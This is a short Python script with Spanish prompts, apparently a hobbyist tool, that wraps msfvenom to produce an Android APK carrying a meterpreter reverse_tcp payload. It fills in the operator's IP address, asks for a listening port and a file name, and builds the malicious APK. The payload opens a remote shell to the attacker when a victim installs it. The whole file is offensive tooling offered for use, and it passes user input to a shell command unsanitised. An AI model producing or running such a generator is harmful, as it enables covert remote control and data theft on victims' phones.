# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
import sys
import socket

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")
def reverse():
    seg = 3
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(100)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)

#-----------------------------------------------------------------------------


def ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return str(e)
ipv4 = ip()


clear()
Barra(desc="Iniciando la Ejecucion: ")
print("\nEjecucion del Payload Completada...")
print("A Continuacion, Se Completara La Creacion De La Apk\n")
print(f"Se Ha Establecido Tu Direccion IP ({ipv4}) Por Defecto")

ipv = input("¿Desea Cambiar La Direcccion IP Configurada por defecto? (y/n): ")
if ipv == "y":
    v4 = input("Ingrese Su Direccion IP: ")
    print(f"Se ha Establecido Tu direccion IP ({v4})")
    ipv4 = v4

clear()
port = int(input("Proporcione un Puerto de Escucha: "))
print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
reverse()

clear()
print("**** Terminando La Creacion del APK **** ")
name = input("\nIngrese el Nombre del Archivo: ")
print(f"Se Ha establecido El Nombre del Archivo ({name}.apk) Correctamente! ")
reverse()
clear()
Barra(desc="Creando Archivo .Apk")

try:
    comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ipv4 + " LPORT="+ str(port) + " -o " + name +".apk"
    resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
    print("Se Ha Creado El Archivo .APK Correctamente\n")
    print("*** Informacion Y Detalles ***")
    print(f"Name:{name}.apk")
    print(f"IP: {ipv4}")
    print(f"PORT: {port}")
    input("\nPresione Enter Para Finalizar... ")
    
except subprocess.CalledProcessError as e:
    print(f"Error al Crear El Archivo :( {e}")
    input("\nPresione Enter Para Finalizar... ")

    